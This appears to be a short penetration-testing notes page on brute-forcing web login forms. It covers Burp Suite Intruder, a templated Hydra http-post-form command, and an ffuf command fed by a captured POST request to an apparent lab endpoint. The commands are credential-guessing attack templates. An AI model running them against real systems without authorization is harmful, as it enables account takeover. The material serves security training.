# Authentication Attacks

## Brute Force

### Burpsuite

Grabbing the POST request in the http history under the proxy and sending that to intruder is an easy way to manage this. You will be throttled on the community edition

### Hydra

{% code overflow="wrap" %}
```bash
hydra -l [login] -P [pass list] [target] -s [port] http-post-form "/[endpoint.ext]:[userparam]=^USER^&[passparam]=^PASS^:F=[failure string]"
```
{% endcode %}

### FFUF

Taking the POST request from BurpSuite and making a file out of it to feed to ffuf works great, replacing the target with the FUZZ operator:

```json
POST /labs/a0x01.php HTTP/1.1
Host: 100.79.20.39
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:146.0) Gecko/20100101 Firefox/146.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br

Content-Length: 33

Referer: http://100.79.20.39/labs/a0x01.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=jeremy&password=FUZZ
```

Then, run ffuf using the request:

{% code overflow="wrap" %}
```bash
ffuf -request [request file] -request-proto http -w [wordlist] -fs [size of failure page]
```
{% endcode %}
